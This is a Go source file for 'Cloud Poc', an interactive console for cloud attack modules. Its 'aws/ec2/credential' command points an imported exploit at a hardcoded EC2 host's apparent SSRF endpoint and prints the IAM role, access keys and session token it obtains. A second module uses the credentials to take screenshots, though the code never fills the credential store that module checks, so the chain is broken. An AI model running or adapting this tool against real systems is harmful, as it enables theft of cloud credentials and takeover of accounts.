package main

import (
	"bufio"
	"fmt"
	"os"
	"reflect"
	"strings"

	"github.com/gookit/color"

	ec2 "github.com/windasunny/cloud-poc/module/aws/ec2"
)

type CloudPoc struct {
	prompt    string
	targetNum int
	exploit   string
}

type ec2Token struct {
	IamRole         string
	AccessKeyId     string
	SecretAccessKey string
	Token           string
	SsrfUrl         string
}

type awsCreds struct {
	Region          string
	AccessKeyId     string
	SecretAccessKey string
}

var ec2GetToken ec2Token
var awsCredsInfo awsCreds

func NewCloudPoc() *CloudPoc {
	return &CloudPoc{
		prompt:    "[Cloud Poc] >> ",
		targetNum: 1,
	}
}

func (cloud *CloudPoc) asciiArt() {
	color.Blue.Println("      _                 _     ")
	color.Blue.Println("     | |               | |    ")
	color.Blue.Println("  ___| | ___  _   _  __| |___ ")
	color.Blue.Println(" / __| |/ _ \\| | | |/ _` / __|")
	color.Blue.Println("| (__| | (_) | |_| | (_| \\__ \\")
	color.Blue.Println(" \\___|_|\\___/ \\__,_|\\__,_|___/")
	color.Blue.Println("                              ")
}

func firstUpper(s string) string {
	if s == "" {
		return ""
	}
	return strings.ToUpper(s[:1]) + s[1:]
}

func getSubdirectories(path string) ([]string, error) {
	var subdirectories []string

	files, err := os.ReadDir(path)
	if err != nil {
		return nil, err
	}

	for _, file := range files {
		if file.IsDir() {
			subdirectories = append(subdirectories, file.Name())
		}
	}

	return subdirectories, nil
}

func (cloud *CloudPoc) handleInput(input string) {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return
	}

	cmdName := firstUpper(parts[0])
	cmdArgs := parts[1:]

	cloudType := reflect.TypeOf(cloud)
	method, found := cloudType.MethodByName(cmdName)

	if found {
		var args []reflect.Value
		args = append(args, reflect.ValueOf(cloud))
		if (cmdName == "Use" || cmdName == "List") && len(cmdArgs) > 0 {
			args = append(args, reflect.ValueOf(cmdArgs[0]))
		} else {
			args = append(args, reflect.ValueOf(cmdArgs))
		}

		method.Func.Call(args)
	} else {
		color.Red.Println("Unknown command. Type 'help' for available commands.")
	}
}

func (cloud *CloudPoc) Help(args []string) {
	color.White.Println("Available commands:")
	color.White.Println("  help - Show this help message")
	color.White.Println("  aws - Use aws module")
	color.White.Println("    list - List available commands in aws module")
	color.White.Println("    ec2 - use ec2 imds exploit module")
	color.White.Println("  quit - Exit the program")
}

func (cloud *CloudPoc) List(module string) {
	if module == "" {
		color.Red.Println("No module selected. Type 'help' for available commands.")
		return
	}

	color.Cyan.Println("Module: ", module)
	color.White.Println("Available commands:")

	modulePath := "module/" + module
	subdirectories, err := getSubdirectories(modulePath)
	if err != nil {
		color.Red.Println("Module Error:", err)
		return
	}

	for _, dir := range subdirectories {
		color.White.Println("  ", dir)
	}
}

func (cloud *CloudPoc) Use(exploit string) {
	if len(exploit) == 0 {
		color.Red.Println("No module specified. Type 'help' for available commands.")
		return
	}

	switch exploit {
	case "aws/ec2/credential":
		printPrompt(cloud, exploit)

		ec2Exploit := ec2.NewEC2Module("http://ec2-54-156-95-23.compute-1.amazonaws.com:12345/index?url=")

		ec2Credential := ec2Exploit.Exploit()
		ec2GetToken = ec2Token{
			IamRole:         ec2Credential.IamRole,
			AccessKeyId:     ec2Credential.AccessKeyId,
			SecretAccessKey: ec2Credential.SecretAccessKey,
			Token:           ec2Credential.Token,
			SsrfUrl:         ec2Credential.SsrfUrl,
		}

		fmt.Println(ec2GetToken.IamRole)
		fmt.Println(ec2GetToken.AccessKeyId)
		fmt.Println(ec2GetToken.SecretAccessKey)
		fmt.Println(ec2GetToken.Token)
		break
	case "aws/ec2/screenshot":
		printPrompt(cloud, exploit)

		if awsCredsInfo.AccessKeyId == "" && awsCredsInfo.SecretAccessKey == "" {
			color.Red.Println("Please use the 'aws/ec2/credential' module first.")
			return
		}

		ec2.Screenshot(awsCredsInfo.AccessKeyId, awsCredsInfo.SecretAccessKey)

	default:
		color.Red.Println("Unknown module. Type 'help' for available commands.")
		return
	}
}

func (cloud *CloudPoc) cmdLoop() {
	cloud.asciiArt()
	color.Cyan.Println("Welcome to Cloud Poc, which provides cloud POC. Type \"help\" to see the list of available commands.\n")

	scanner := bufio.NewScanner(os.Stdin)
	for {
		color.Green.Print(cloud.prompt)
		scanner.Scan()
		input := scanner.Text()
		if strings.ToLower(input) == "quit" || strings.ToLower(input) == "exit" {
			color.Green.Println("Exiting...")
			break
		}
		cloud.handleInput(input)
	}
}

func printPrompt(cloud *CloudPoc, exploit string) {
	cloud.exploit = exploit
	cloud.prompt = fmt.Sprintf("[Cloud Poc] >> [%s] >> ", cloud.exploit)
}

func main() {
	cloudPoc := NewCloudPoc()
	cloudPoc.cmdLoop()
}
